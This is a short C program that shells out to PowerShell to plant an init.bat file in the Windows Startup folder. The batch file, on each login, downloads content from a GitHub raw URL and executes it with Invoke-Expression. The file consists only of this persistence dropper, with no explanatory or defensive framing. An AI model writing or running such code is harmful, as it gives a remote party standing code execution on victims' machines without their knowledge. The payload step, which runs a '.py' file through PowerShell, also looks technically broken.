#include <stdlib.h>

int main() {
    system(
        "powershell -NoProfile -Command \""
            "$startup = [Environment]::GetFolderPath('Startup'); "
            "$content = 'powershell -Command \"\"iex (Invoke-WebRequest ''https://raw.githubusercontent.com/rickastley10/fetch/refs/heads/main/fetch.py'').Content\"\"'; "
            "Set-Content -Path (Join-Path $startup 'init.bat') -Value $content"
        "\""
    );
    return 0;
}
